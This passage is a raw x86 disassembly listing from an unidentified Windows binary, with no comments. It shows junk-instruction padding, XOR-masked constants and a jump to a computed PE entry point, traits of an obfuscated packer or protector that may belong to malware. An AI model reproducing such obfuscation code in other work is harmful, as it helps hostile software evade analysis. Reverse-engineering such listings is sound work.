  41c4fa:	sbb    DWORD PTR ds:0x426f05,0x67a3
  41c504:	mov    eax,DWORD PTR [eax+0x18c]
  41c50a:	adc    DWORD PTR ds:0x426e91,0x180f
  41c514:	mov    eax,DWORD PTR [eax]
  41c516:	sbb    DWORD PTR ds:0x426eb1,0x4112
  41c520:	mov    DWORD PTR [esp+0x48],eax
  41c524:	adc    DWORD PTR ds:0x426eb9,edi
  41c52a:	mov    eax,0xf89c85b9
  41c52f:	mov    DWORD PTR [esp+0x38],eax
  41c533:	inc    DWORD PTR ds:0x426e8d
  41c539:	mov    DWORD PTR [esp+0x38],eax
  41c53d:	xor    DWORD PTR ds:0x426f11,0x441e
  41c547:	mov    DWORD PTR [esp+0x38],eax
  41c54b:	mov    DWORD PTR [esp+0x38],ecx
  41c54f:	neg    DWORD PTR ds:0x426f25
  41c555:	mov    DWORD PTR [esp+0x28],eax
  41c559:	movzx  eax,WORD PTR ds:0x426ec5
  41c560:	sbb    eax,DWORD PTR ds:0x426ee1
  41c566:	mov    ds:0x426ec5,eax
  41c56b:	mov    DWORD PTR [esp+0x28],0xf89c85bd
  41c573:	sbb    DWORD PTR ds:0x426ef9,0x58a6
  41c57d:	mov    eax,DWORD PTR [esp+0x10]
  41c581:	xor    eax,esi
  41c583:	add    eax,ebx
  41c585:	jmp    0x41c7a3
  41c58a:	mov    DWORD PTR ds:0x426eb5,0x6384
  41c594:	mov    al,ds:0x42647f
  41c599:	mov    DWORD PTR ds:0x426f01,0x6aa0
  41c5a3:	cmp    al,BYTE PTR ds:0x42648a
  41c5a9:	mov    DWORD PTR ds:0x426e85,0x34fb
  41c5b3:	jne    0x41c211
  41c5b9:	mov    DWORD PTR ds:0x426e99,0x7ac4
  41c5c3:	mov    al,ds:0x42649c
  41c5c8:	cmp    al,BYTE PTR ds:0x4264ab
  41c5ce:	mov    DWORD PTR ds:0x426e99,0x679f
  41c5d8:	jne    0x41c211
  41c5de:	push   0x4264b5
  41c5e3:	or     DWORD PTR ds:0x426e99,0x4d97
  41c5ed:	push   0x4264c5
  41c5f2:	call   edi
  41c5f4:	test   eax,eax
  41c5f6:	mov    DWORD PTR ds:0x426ecd,0x4160
  41c600:	je     0x41c211
  41c606:	mov    DWORD PTR ds:0x426ec5,0x29ef
  41c610:	mov    al,ds:0x4264db
  41c615:	cmp    al,BYTE PTR ds:0x4264e6
  41c61b:	jne    0x41c211
  41c621:	mov    al,ds:0x4264f8
  41c626:	mov    DWORD PTR ds:0x426ecd,0x6d7c
  41c630:	cmp    al,BYTE PTR ds:0x426507
  41c636:	mov    DWORD PTR ds:0x426ee5,0x7eb8
  41c640:	jne    0x41c211
  41c646:	sub    DWORD PTR ds:0x426ef9,0x282b
  41c650:	push   0x426511
  41c655:	push   0x426521
  41c65a:	call   edi
  41c65c:	sbb    DWORD PTR ds:0x426edd,0x426e9d
  41c666:	test   eax,eax
  41c668:	mov    DWORD PTR ds:0x426ee9,0x3f4b
  41c672:	je     0x41c211
  41c678:	and    DWORD PTR ds:0x426e91,0x0
  41c682:	xor    eax,eax
  41c684:	xor    eax,DWORD PTR ds:0x426e91
  41c68a:	inc    eax
  41c68b:	mov    ds:0x426e91,eax
  41c690:	cmp    DWORD PTR ds:0x426e91,0x9
  41c697:	ja     0x41c6d0
  41c69d:	jmp    0x41c6a8
  41c6a2:	call   DWORD PTR ds:0x430a20
  41c6a8:	cmp    DWORD PTR ds:0x426e91,0x8
  41c6af:	jne    0x41c6c3
  41c6b5:	xor    eax,eax
  41c6b7:	add    eax,DWORD PTR ds:0x426e91
  41c6bd:	inc    eax
  41c6be:	mov    ds:0x426e91,eax
  41c6c3:	cmp    DWORD PTR ds:0x426e91,0x1a
  41c6ca:	jb     0x41c682
  41c6d0:	mov    eax,DWORD PTR [esp+0x1c]
  41c6d4:	adc    DWORD PTR ds:0x426f01,ecx
  41c6da:	mov    ecx,DWORD PTR [esp+0x28]
  41c6de:	xor    eax,esi
  41c6e0:	lea    eax,[eax+ecx*1+0x3272fa]
  41c6e7:	push   eax
  41c6e8:	xor    eax,DWORD PTR ds:0x426eb1
  41c6ee:	mov    eax,DWORD PTR [esp+0x3c]
  41c6f2:	adc    DWORD PTR ds:0x426ec1,0x19c6
  41c6fc:	xor    eax,esi
  41c6fe:	sbb    DWORD PTR ds:0x426ec5,0x426ea9
  41c708:	lea    eax,[ebp+eax*1+0x327302]
  41c70f:	xor    DWORD PTR ds:0x426ec1,0x34b0
  41c719:	push   eax
  41c71a:	xor    eax,DWORD PTR ds:0x426e99
  41c720:	mov    eax,ds:0x4262c9
  41c725:	adc    DWORD PTR ds:0x426ea5,0x426f09
  41c72f:	push   DWORD PTR [eax+0x1bc]
  41c735:	adc    DWORD PTR ds:0x426f0d,0x426ea5
  41c73f:	call   0x41d27f
  41c744:	mov    eax,DWORD PTR [esp+0x1c]
  41c748:	mov    ecx,DWORD PTR [esp+0x28]
  41c74c:	xor    eax,esi
  41c74e:	and    DWORD PTR ds:0x426e85,0x0
  41c758:	mov    edx,DWORD PTR ds:0x426e85
  41c75e:	inc    edx
  41c75f:	mov    DWORD PTR ds:0x426e85,edx
  41c765:	cmp    DWORD PTR ds:0x426e85,0x22
  41c76c:	jl     0x41c79c
  41c772:	jmp    0x41c78f
  41c777:	push   0x426000
  41c77c:	push   0x29cf
  41c781:	push   0x6715
  41c786:	push   DWORD PTR [ebp-0x18]
  41c789:	call   DWORD PTR ds:0x430a24
  41c78f:	cmp    DWORD PTR ds:0x426e85,0x1b
  41c796:	jb     0x41c758
  41c79c:	lea    eax,[ecx+eax*1+0x3272fa]
  41c7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41c7a7:	mov    edx,DWORD PTR [esp+0x1c]
  41c7ab:	xor    edx,esi
  41c7ad:	sbb    DWORD PTR ds:0x426f29,0x426e8d
  41c7b7:	xor    ecx,esi
  41c7b9:	add    ecx,edx
  41c7bb:	sbb    edx,DWORD PTR ds:0x426f1d
  41c7c1:	mov    edx,DWORD PTR [esp+0x1c]
  41c7c5:	adc    DWORD PTR ds:0x426ef9,0x135a
  41c7cf:	xor    edx,esi
  41c7d1:	mov    DWORD PTR ds:0x426ee5,0x2979
  41c7db:	lea    ecx,[ecx+edx*1+0x9758ee]
  41c7e2:	mov    DWORD PTR ds:0x426f2d,0x689
  41c7ec:	mov    DWORD PTR [esp+0x28],eax
  41c7f0:	cmp    eax,ecx
  41c7f2:	mov    DWORD PTR ds:0x426efd,0x13db
  41c7fc:	jbe    0x41c58a
  41c802:	mov    eax,DWORD PTR [ebp+0xc]
  41c805:	mov    ds:0x42614d,eax
  41c80a:	and    DWORD PTR ds:0x426eb1,0x0
  41c814:	jmp    0x41c824
  41c819:	mov    eax,ds:0x426eb1
  41c81e:	inc    eax
  41c81f:	mov    ds:0x426eb1,eax
  41c824:	cmp    DWORD PTR ds:0x426eb1,0x19
  41c82b:	jae    0x41c851
  41c831:	cmp    DWORD PTR ds:0x426eb1,0x20
  41c838:	jl     0x41c851
  41c83e:	jmp    0x41c84c
  41c843:	push   DWORD PTR [ebp-0xc]
  41c846:	call   DWORD PTR ds:0x430a28
  41c84c:	jmp    0x41c819
  41c851:	mov    eax,DWORD PTR [ebp+0x10]
  41c854:	mov    ds:0x4263a9,eax
  41c859:	mov    ecx,DWORD PTR ds:0x42af61
  41c85f:	mov    eax,ds:0x42af6d
  41c864:	sub    eax,ecx
  41c866:	xor    ecx,DWORD PTR [ecx+eax*1]
  41c869:	mov    eax,ds:0x42614d
  41c86e:	inc    ecx
  41c86f:	mov    ecx,DWORD PTR [esp+0x44]
  41c873:	sbb    DWORD PTR ds:0x426f0d,0x426ed5
  41c87d:	sub    eax,ebx
  41c87f:	sub    DWORD PTR ds:0x426eed,0x426f05
  41c889:	xor    eax,esi
  41c88b:	mov    DWORD PTR [ecx],eax
  41c88d:	mov    DWORD PTR ds:0x426ea1,0x1d16
  41c897:	lea    eax,[esp+0x20]
  41c89b:	mov    DWORD PTR ds:0x426f1d,0x743e
  41c8a5:	mov    DWORD PTR [esp+0x4c],eax
  41c8a9:	mov    DWORD PTR ds:0x426eb5,0x1725
  41c8b3:	lea    eax,[ebp+0x4]
  41c8b6:	mov    DWORD PTR ds:0x426f0d,0x331f
  41c8c0:	mov    DWORD PTR [esp+0x20],eax
  41c8c4:	mov    DWORD PTR ds:0x426ea1,0x4fd1
  41c8ce:	mov    al,ds:0x426537
  41c8d3:	cmp    al,BYTE PTR ds:0x426542
  41c8d9:	jne    0x41c211
  41c8df:	mov    al,ds:0x426554
  41c8e4:	mov    DWORD PTR ds:0x426e99,0x22c3
  41c8ee:	cmp    al,BYTE PTR ds:0x426563
  41c8f4:	mov    DWORD PTR ds:0x426f21,0x5c30
  41c8fe:	jne    0x41c211
  41c904:	sub    DWORD PTR ds:0x426eb5,0x53da
  41c90e:	push   0x42656d
  41c913:	sbb    DWORD PTR ds:0x426f0d,0x426f15
  41c91d:	push   0x42657d
  41c922:	sbb    DWORD PTR ds:0x426e81,0x426e95
  41c92c:	call   edi
  41c92e:	test   eax,eax
  41c930:	mov    DWORD PTR ds:0x426f09,0x3f7d
  41c93a:	je     0x41c211
  41c940:	mov    al,ds:0x426593
  41c945:	mov    DWORD PTR ds:0x426f09,0x7a71
  41c94f:	cmp    al,BYTE PTR ds:0x42659e
  41c955:	mov    DWORD PTR ds:0x426f21,0x448e
  41c95f:	jne    0x41c211
  41c965:	mov    al,ds:0x4265b0
  41c96a:	cmp    al,BYTE PTR ds:0x4265bf
  41c970:	jne    0x41c211
  41c976:	push   0x4265c9
  41c97b:	add    DWORD PTR ds:0x426eb9,0x4508
  41c985:	push   0x4265d9
  41c98a:	call   edi
  41c98c:	test   eax,eax
  41c98e:	je     0x41c211
  41c994:	mov    DWORD PTR ds:0x426ed1,0x4635
  41c99e:	mov    al,ds:0x4265ef
  41c9a3:	mov    DWORD PTR ds:0x426f11,0x2d29
  41c9ad:	cmp    al,BYTE PTR ds:0x4265fa
  41c9b3:	mov    DWORD PTR ds:0x426f1d,0x5285
  41c9bd:	jne    0x41c211
  41c9c3:	mov    DWORD PTR ds:0x426ecd,0x17c5
  41c9cd:	mov    al,ds:0x42660c
  41c9d2:	mov    DWORD PTR ds:0x426ecd,0x1f4b
  41c9dc:	cmp    al,BYTE PTR ds:0x42661b
  41c9e2:	jne    0x41c211
  41c9e8:	push   0x426625
  41c9ed:	adc    DWORD PTR ds:0x426ef1,0x426ee5
  41c9f7:	push   0x426635
  41c9fc:	call   edi
  41c9fe:	adc    DWORD PTR ds:0x426edd,0x72d
  41ca08:	test   eax,eax
  41ca0a:	je     0x41c211
  41ca10:	mov    DWORD PTR ds:0x426ed9,0x3296
  41ca1a:	mov    al,ds:0x42664b
  41ca1f:	mov    DWORD PTR ds:0x426e91,0x9e5
  41ca29:	cmp    al,BYTE PTR ds:0x426656
  41ca2f:	mov    DWORD PTR ds:0x426ee1,0x4731
  41ca39:	jne    0x41c211
  41ca3f:	mov    al,ds:0x426668
  41ca44:	cmp    al,BYTE PTR ds:0x426677
  41ca4a:	jne    0x41c211
  41ca50:	xor    DWORD PTR ds:0x426e85,0x78df
  41ca5a:	push   0x426681
  41ca5f:	push   0x426691
  41ca64:	call   edi
  41ca66:	test   eax,eax
  41ca68:	je     0x41c211
  41ca6e:	mov    DWORD PTR ds:0x426efd,0x48d1
  41ca78:	mov    al,ds:0x4266a7
  41ca7d:	mov    DWORD PTR ds:0x426eb1,0x58ba
  41ca87:	cmp    al,BYTE PTR ds:0x4266b2
  41ca8d:	jne    0x41c211
  41ca93:	mov    al,ds:0x4266c4
  41ca98:	mov    DWORD PTR ds:0x426ea9,0x5172
  41caa2:	cmp    al,BYTE PTR ds:0x4266d3
  41caa8:	mov    DWORD PTR ds:0x426ecd,0x25dc
  41cab2:	jne    0x41c211
  41cab8:	add    DWORD PTR ds:0x426ef5,0x426ea9
  41cac2:	push   0x4266dd
  41cac7:	mov    DWORD PTR ds:0x426f1d,0x534b
  41cad1:	push   0x4266ed
  41cad6:	xor    DWORD PTR ds:0x426e8d,0x426e89
  41cae0:	call   edi
  41cae2:	test   eax,eax
  41cae4:	mov    DWORD PTR ds:0x426f09,0x17e9
  41caee:	je     0x41c211
  41caf4:	mov    DWORD PTR ds:0x426f15,0x546d
  41cafe:	mov    al,ds:0x426703
  41cb03:	mov    DWORD PTR ds:0x426ec9,0x6884
  41cb0d:	cmp    al,BYTE PTR ds:0x42670e
  41cb13:	mov    DWORD PTR ds:0x426e95,0x724e
  41cb1d:	jne    0x41c211
  41cb23:	mov    DWORD PTR ds:0x426eb1,0x7b3e
  41cb2d:	mov    al,ds:0x426720
  41cb32:	mov    DWORD PTR ds:0x426ea9,0xb8a
  41cb3c:	cmp    al,BYTE PTR ds:0x42672f
  41cb42:	mov    DWORD PTR ds:0x426ea5,0xfff
  41cb4c:	jne    0x41c211
  41cb52:	adc    DWORD PTR ds:0x426e81,0x426ed5
  41cb5c:	push   0x426739
  41cb61:	push   0x426749
  41cb66:	call   edi
  41cb68:	mov    DWORD PTR ds:0x426eb1,0x513e
  41cb72:	test   eax,eax
  41cb74:	je     0x41c211
  41cb7a:	mov    al,ds:0x42675f
  41cb7f:	mov    DWORD PTR ds:0x426e8d,0x24d0
  41cb89:	cmp    al,BYTE PTR ds:0x42676a
  41cb8f:	jne    0x41c211
  41cb95:	mov    DWORD PTR ds:0x426eb1,0x7a1a
  41cb9f:	mov    al,ds:0x42677c
  41cba4:	mov    DWORD PTR ds:0x426ef5,0x1244
  41cbae:	cmp    al,BYTE PTR ds:0x42678b
  41cbb4:	mov    DWORD PTR ds:0x426ed1,0x3050
  41cbbe:	jne    0x41c211
  41cbc4:	sub    DWORD PTR ds:0x426ee1,0x426f25
  41cbce:	push   0x426795
  41cbd3:	add    DWORD PTR ds:0x426f11,0x40a8
  41cbdd:	push   0x4267a5
  41cbe2:	sub    DWORD PTR ds:0x426ef9,0x426e9d
  41cbec:	call   edi
  41cbee:	adc    DWORD PTR ds:0x426e99,0x426f0d
  41cbf8:	test   eax,eax
  41cbfa:	je     0x41c211
  41cc00:	mov    al,ds:0x4267bb
  41cc05:	mov    DWORD PTR ds:0x426f05,0xc7b
  41cc0f:	cmp    al,BYTE PTR ds:0x4267c6
  41cc15:	mov    DWORD PTR ds:0x426eb9,0x70f1
  41cc1f:	jne    0x41c211
  41cc25:	mov    al,ds:0x4267d8
  41cc2a:	mov    DWORD PTR ds:0x426f09,0x320
  41cc34:	cmp    al,BYTE PTR ds:0x4267e7
  41cc3a:	mov    DWORD PTR ds:0x426ee1,0xc80
  41cc44:	jne    0x41c211
  41cc4a:	sbb    DWORD PTR ds:0x426e85,0x426ea9
  41cc54:	push   0x4267f1
  41cc59:	adc    DWORD PTR ds:0x426f21,0x426f09
  41cc63:	push   0x426801
  41cc68:	call   edi
  41cc6a:	test   eax,eax
  41cc6c:	mov    DWORD PTR ds:0x426e9d,0x1d82
  41cc76:	je     0x41c211
  41cc7c:	mov    DWORD PTR ds:0x426e8d,0x4c1f
  41cc86:	mov    al,ds:0x426817
  41cc8b:	mov    DWORD PTR ds:0x426ebd,0x2305
  41cc95:	cmp    al,BYTE PTR ds:0x426822
  41cc9b:	mov    DWORD PTR ds:0x426e85,0x52ee
  41cca5:	jne    0x41c211
  41ccab:	mov    DWORD PTR ds:0x426eed,0x1308
  41ccb5:	mov    al,ds:0x426834
  41ccba:	cmp    al,BYTE PTR ds:0x426843
  41ccc0:	mov    DWORD PTR ds:0x426ea9,0x1ac4
  41ccca:	jne    0x41c211
  41ccd0:	push   0x42684d
  41ccd5:	push   0x42685d
  41ccda:	call   edi
  41ccdc:	xor    DWORD PTR ds:0x426eb5,0x537b
  41cce6:	test   eax,eax
  41cce8:	mov    DWORD PTR ds:0x426f2d,0x4412
  41ccf2:	je     0x41c211
  41ccf8:	mov    al,ds:0x426873
  41ccfd:	mov    DWORD PTR ds:0x426eb1,0x52c5
  41cd07:	cmp    al,BYTE PTR ds:0x42687e
  41cd0d:	mov    DWORD PTR ds:0x426f01,0x16df
  41cd17:	jne    0x41c211
  41cd1d:	mov    DWORD PTR ds:0x426ee1,0xd56
  41cd27:	mov    al,ds:0x426890
  41cd2c:	mov    DWORD PTR ds:0x426ed1,0x624d
  41cd36:	cmp    al,BYTE PTR ds:0x42689f
  41cd3c:	mov    DWORD PTR ds:0x426e95,0x6fa7
  41cd46:	jne    0x41c211
  41cd4c:	push   0x4268a9
  41cd51:	push   0x4268b9
  41cd56:	call   edi
  41cd58:	test   eax,eax
  41cd5a:	je     0x41c211
  41cd60:	mov    al,ds:0x4268cf
  41cd65:	mov    DWORD PTR ds:0x426ea5,0x6b61
  41cd6f:	cmp    al,BYTE PTR ds:0x4268da
  41cd75:	mov    DWORD PTR ds:0x426ef1,0x607d
  41cd7f:	jne    0x41c211
  41cd85:	mov    al,ds:0x4268ec
  41cd8a:	mov    DWORD PTR ds:0x426f11,0x76ce
  41cd94:	cmp    al,BYTE PTR ds:0x4268fb
  41cd9a:	mov    DWORD PTR ds:0x426ea9,0x7be9
  41cda4:	jne    0x41c211
  41cdaa:	push   0x426905
  41cdaf:	xor    DWORD PTR ds:0x426e89,0x5d69
  41cdb9:	push   0x426915
  41cdbe:	call   edi
  41cdc0:	test   eax,eax
  41cdc2:	je     0x41c211
  41cdc8:	mov    al,ds:0x42692b
  41cdcd:	mov    DWORD PTR ds:0x426eed,0x2af5
  41cdd7:	cmp    al,BYTE PTR ds:0x426936
  41cddd:	mov    DWORD PTR ds:0x426ed9,0x56c9
  41cde7:	jne    0x41c211
  41cded:	mov    DWORD PTR ds:0x426f09,0x21f5
  41cdf7:	mov    al,ds:0x426948
  41cdfc:	cmp    al,BYTE PTR ds:0x426957
  41ce02:	jne    0x41c211
  41ce08:	push   0x426961
  41ce0d:	sub    DWORD PTR ds:0x426ef1,0x426f19
  41ce17:	push   0x426971
  41ce1c:	call   edi
  41ce1e:	or     DWORD PTR ds:0x426f11,0x426ea1
  41ce28:	test   eax,eax
  41ce2a:	je     0x41c211
  41ce30:	mov    DWORD PTR ds:0x426f1d,0x33c9
  41ce3a:	mov    al,ds:0x426987
  41ce3f:	cmp    al,BYTE PTR ds:0x426992
  41ce45:	jne    0x41c211
  41ce4b:	mov    al,ds:0x4269a4
  41ce50:	cmp    al,BYTE PTR ds:0x4269b3
  41ce56:	jne    0x41c211
  41ce5c:	push   0x4269bd
  41ce61:	push   0x4269cd
  41ce66:	call   edi
  41ce68:	test   eax,eax
  41ce6a:	je     0x41c211
  41ce70:	mov    al,ds:0x4269e3
  41ce75:	cmp    al,BYTE PTR ds:0x4269ee
  41ce7b:	jne    0x41c211
  41ce81:	mov    al,ds:0x426a00
  41ce86:	cmp    al,BYTE PTR ds:0x426a0f
  41ce8c:	jne    0x41c211
  41ce92:	push   0x426a19
  41ce97:	push   0x426a29
  41ce9c:	call   edi
  41ce9e:	test   eax,eax
  41cea0:	je     0x41c211
  41cea6:	mov    al,ds:0x426a3f
  41ceab:	cmp    al,BYTE PTR ds:0x426a4a
  41ceb1:	jne    0x41c211
  41ceb7:	mov    al,ds:0x426a5c
  41cebc:	cmp    al,BYTE PTR ds:0x426a6b
  41cec2:	jne    0x41c211
  41cec8:	push   0x426a75
  41cecd:	push   0x426a85
  41ced2:	call   edi
  41ced4:	test   eax,eax
  41ced6:	je     0x41c211
  41cedc:	mov    al,ds:0x426a9b
  41cee1:	cmp    al,BYTE PTR ds:0x426aa6
  41cee7:	jne    0x41c211
  41ceed:	mov    al,ds:0x426ab8
  41cef2:	cmp    al,BYTE PTR ds:0x426ac7
  41cef8:	jne    0x41c211
  41cefe:	push   0x426ad1
  41cf03:	push   0x426ae1
  41cf08:	call   edi
  41cf0a:	test   eax,eax
  41cf0c:	je     0x41c211
  41cf12:	mov    al,ds:0x426af7
  41cf17:	cmp    al,BYTE PTR ds:0x426b02
  41cf1d:	jne    0x41c211
  41cf23:	mov    al,ds:0x426b14
  41cf28:	cmp    al,BYTE PTR ds:0x426b23
  41cf2e:	jne    0x41c211
  41cf34:	push   0x426b2d
  41cf39:	push   0x426b3d
  41cf3e:	call   edi
  41cf40:	test   eax,eax
  41cf42:	je     0x41c211
  41cf48:	mov    al,ds:0x426b53
  41cf4d:	cmp    al,BYTE PTR ds:0x426b5e
  41cf53:	jne    0x41c211
  41cf59:	mov    al,ds:0x426b70
  41cf5e:	cmp    al,BYTE PTR ds:0x426b7f
  41cf64:	jne    0x41c211
  41cf6a:	push   0x426b89
  41cf6f:	push   0x426b99
  41cf74:	call   edi
  41cf76:	test   eax,eax
  41cf78:	je     0x41c211
  41cf7e:	mov    al,ds:0x426baf
  41cf83:	cmp    al,BYTE PTR ds:0x426bba
  41cf89:	jne    0x41c211
  41cf8f:	mov    al,ds:0x426bcc
  41cf94:	cmp    al,BYTE PTR ds:0x426bdb
  41cf9a:	jne    0x41c211
  41cfa0:	push   0x426be5
  41cfa5:	push   0x426bf5
  41cfaa:	call   edi
  41cfac:	test   eax,eax
  41cfae:	je     0x41c211
  41cfb4:	mov    al,ds:0x426c0b
  41cfb9:	cmp    al,BYTE PTR ds:0x426c16
  41cfbf:	jne    0x41c211
  41cfc5:	mov    al,ds:0x426c28
  41cfca:	cmp    al,BYTE PTR ds:0x426c37
  41cfd0:	jne    0x41c211
  41cfd6:	push   0x426c41
  41cfdb:	push   0x426c51
  41cfe0:	call   edi
  41cfe2:	test   eax,eax
  41cfe4:	je     0x41c211
  41cfea:	mov    al,ds:0x426c67
  41cfef:	cmp    al,BYTE PTR ds:0x426c72
  41cff5:	jne    0x41c211
  41cffb:	mov    al,ds:0x426c84
  41d000:	cmp    al,BYTE PTR ds:0x426c93
  41d006:	jne    0x41c211
  41d00c:	push   0x426c9d
  41d011:	push   0x426cad
  41d016:	call   edi
  41d018:	test   eax,eax
  41d01a:	je     0x41c211
  41d020:	mov    eax,DWORD PTR [esp+0x34]
  41d024:	cmp    eax,0xf89c85b4
  41d029:	je     0x41d088
  41d02f:	mov    eax,DWORD PTR [esp+0x10]
  41d033:	mov    ecx,DWORD PTR [esp+0x30]
  41d037:	xor    eax,esi
  41d039:	add    eax,ebx
  41d03b:	cmp    eax,ecx
  41d03d:	je     0x41d088
  41d043:	mov    eax,ds:0x4262c9
  41d048:	mov    eax,DWORD PTR [eax+0x194]
  41d04e:	mov    ecx,DWORD PTR [eax]
  41d050:	mov    eax,DWORD PTR [ecx+0x3c]
  41d053:	push   DWORD PTR ds:0x4263a9
  41d059:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41d05d:	push   DWORD PTR ds:0x42614d
  41d063:	add    eax,ecx
  41d065:	mov    ecx,DWORD PTR ds:0x4262c9
  41d06b:	mov    ecx,DWORD PTR [ecx+0x194]
  41d071:	push   DWORD PTR [ecx]
  41d073:	call   eax
  41d075:	mov    ecx,DWORD PTR ds:0x4262c9
  41d07b:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d081:	mov    DWORD PTR [ecx],eax
  41d083:	jmp    0x41d259
  41d088:	mov    eax,DWORD PTR [esp+0x10]
  41d08c:	mov    ecx,DWORD PTR [esp+0x48]
  41d090:	xor    eax,esi
  41d092:	add    eax,ebx
  41d094:	cmp    eax,ecx
  41d096:	jne    0x41d101
  41d09c:	mov    eax,DWORD PTR [esp+0x10]
  41d0a0:	mov    ecx,DWORD PTR ds:0x4262c9
  41d0a6:	mov    ecx,DWORD PTR [ecx+0x198]
  41d0ac:	xor    eax,esi
  41d0ae:	add    eax,ebx
  41d0b0:	cmp    eax,DWORD PTR [ecx]
  41d0b2:	jne    0x41d0da
  41d0b8:	mov    eax,DWORD PTR [esp+0x10]
  41d0bc:	push   0xffffffff
  41d0be:	push   0x70941f8a
  41d0c3:	xor    eax,esi
  41d0c5:	add    eax,ebx
  41d0c7:	push   eax
  41d0c8:	push   0xf89c85b9
  41d0cd:	push   DWORD PTR [esp+0x2c]
  41d0d1:	push   DWORD PTR [esp+0x24]
  41d0d5:	call   0x417355
  41d0da:	push   DWORD PTR [esp+0x1c]
  41d0de:	push   DWORD PTR [esp+0x14]
  41d0e2:	call   0x401000
  41d0e7:	mov    eax,DWORD PTR [esp+0x10]
  41d0eb:	xor    eax,esi
  41d0ed:	add    eax,ebx
  41d0ef:	mov    ds:0x426355,eax
  41d0f4:	mov    eax,DWORD PTR [esp+0x10]
  41d0f8:	xor    eax,esi
  41d0fa:	add    eax,ebx
  41d0fc:	mov    ds:0x42634d,eax
  41d101:	mov    eax,DWORD PTR [esp+0x20]
  41d105:	test   eax,eax
  41d107:	je     0x41d259
  41d10d:	mov    DWORD PTR [esp+0x50],0xf152c3c
  41d115:	mov    DWORD PTR [esp+0x54],0x712edcf
  41d11d:	mov    DWORD PTR [esp+0x58],0x373fc2d
  41d125:	mov    DWORD PTR [esp+0x5c],0x72670add
  41d12d:	call   0x416fa9
  41d132:	mov    eax,DWORD PTR [esp+0x24]
  41d136:	mov    eax,DWORD PTR [esp+0x1c]
  41d13a:	mov    DWORD PTR [esp+0x44],eax
  41d13e:	mov    eax,DWORD PTR [esp+0x10]
  41d142:	mov    DWORD PTR [esp+0x1c],eax
  41d146:	mov    eax,eax
  41d148:	mov    eax,ds:0x4262c9
  41d14d:	mov    ecx,DWORD PTR [eax+0x1c0]
  41d153:	mov    edx,DWORD PTR [ecx]
  41d155:	and    DWORD PTR [esp+0x3c],0x0
  41d15a:	mov    edi,0xfabdbecd
  41d15f:	add    edx,edi
  41d161:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c91
  41d28a:	mov    ecx,DWORD PTR ds:0x429d55
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
